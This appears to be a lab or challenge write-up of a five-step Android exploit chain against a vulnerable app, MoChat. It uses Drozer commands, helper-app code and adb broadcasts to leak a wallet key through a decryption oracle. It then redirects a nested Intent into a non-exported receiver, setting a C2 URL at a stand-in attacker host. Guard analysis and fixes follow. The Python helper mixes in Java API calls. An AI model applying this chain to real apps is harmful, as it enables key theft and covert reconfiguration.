# Chain 04 — Messenger Oracle + Intent Redirect

## Overview

| Field | Value |
|-------|-------|
| **Category** | service + intent |
| **Difficulty** | HARD |
| **Steps** | 5 |
| **Components crossed** | WalletService → ShareReceiver |
| **Modern Android** | Fully exploitable (Android 13-16) |
| **decx shape** | service enumeration → oracle leak → nested intent → exported redirect → protected sink |

## Vulnerable surface

- `WalletService` (Messenger, exported) — message codes `0xD01`-`0xD03` reachable by any caller
- `MSG_DECRYPT` (`0xD01`) — decryption oracle returns balance and `WALLET_KEY`
- `ShareReceiver` (exported) — accepts `nextIntent` extra and re-fires it on behalf of the app
- Non-exported internal components trust any intent they receive once dispatched by `ShareReceiver`

## Step-by-step exploit

### ① Bind exported WalletService, enumerate msg.what codes

```bash
# Drozer: enumerate the Messenger interface by sending probe messages and watching replies.
dz> run app.service.send com.mochat.app com.mochat.app.wallet.WalletService \
     --msg 0xD01 0 0 --extra string b64 ""
# reply.what = 0xD01 -> handler reachable
# 0xD02 -> ack, 0xD03 -> error disclosing internal class names
```

Map `0xD01` = MSG_DECRYPT, `0xD02` = MSG_BALANCE, `0xD03` = MSG_ERROR.

### ② MSG_DECRYPT reveals balance and WALLET_KEY

```python
# Attacker helper app binds the Messenger and sends the decrypt message.
msg = Message.obtain()
msg.what = 0xD01
msg.obj  = None
bundle = Bundle(); bundle.putString("b64", base64.b64encode(blob))
msg.data = bundle
messenger.send(msg)
# reply.data -> {"plain":"8123400","wallet_key":"MoChat!"}
```

### ③ Craft a nested Intent targeting non-exported internal components

```java
// Non-exported component (e.g. InternalConfigReceiver) would reject a direct send.
// Wrap it so ShareReceiver re-fires it under the app's own identity.
Intent inner = new Intent("com.mochat.app.INTERNAL_CONFIG");
inner.setClassName("com.mochat.app", "com.mochat.app.internal.InternalConfigReceiver");
inner.putExtra("override_url", "https://attacker.example/c2");
```

### ④ Send to exported ShareReceiver with nextIntent extra → redirected

```bash
# Serialize the inner intent as PARCELABLE extra and hand it to the exported receiver.
adb shell am broadcast -n com.mochat.app/.share.ShareReceiver \
  --es action "share" \
  --eu com.mochat.app.extra.nextIntent "$(serialize_intent_json inner)"
```

Or from a helper app:

```java
Intent redirect = new Intent();
redirect.setClassName("com.mochat.app", "com.mochat.app.share.ShareReceiver");
redirect.putExtra("nextIntent", inner);   // Parcelable Intent extra
context.sendBroadcast(redirect);
```

### ⑤ The redirected intent reaches a protected component under app identity

`ShareReceiver` does:

```java
Intent next = intent.getParcelableExtra("nextIntent");
context.sendBroadcast(next);   // re-sent as com.mochat.app -> bypasses non-exported check
```

**logcat confirms**:

```
ShareReceiver: redirecting action=com.mochat.app.INTERNAL_CONFIG
InternalConfigReceiver: override_url=https://attacker.example/c2 caller=com.mochat.app
```

## Guard analysis

| Guard | Status |
|-------|--------|
| WalletService caller check | absent (exported, any app binds) |
| MSG_DECRYPT authentication | absent (oracle reachable by any caller) |
| ShareReceiver permission | absent (exported, any caller) |
| ShareReceiver nextIntent validation | absent (blind re-send) |
| Internal component trust model | broken (relies on non-exported, defeated by redirect) |

## Impact

An attacker with no privileges turns an exported receiver into a trampoline that delivers
intents to otherwise-protected internal components, under the app's own identity. Combined with
the `MSG_DECRYPT` oracle, the attacker obtains the WALLET_KEY and balance, then uses the
redirect to reconfigure internal state (C2 URL, feature flags, admin toggles) without ever
touching a guarded entrypoint.

## Fix

- Remove `MSG_DECRYPT` from any exported service; never expose a crypto/decryption oracle.
- Require a signature or custom signature-protected permission on `WalletService` and
  `ShareReceiver`.
- `ShareReceiver` must not re-fire arbitrary caller-supplied Intents. If forwarding is required,
  reconstruct a fixed-destination intent from validated parameters rather than echoing the
  Parcelable.
- Treat "non-exported" as a deployment detail, not a security control — re-validate intent
  origin inside internal components via `Binder.getCallingUid()`.
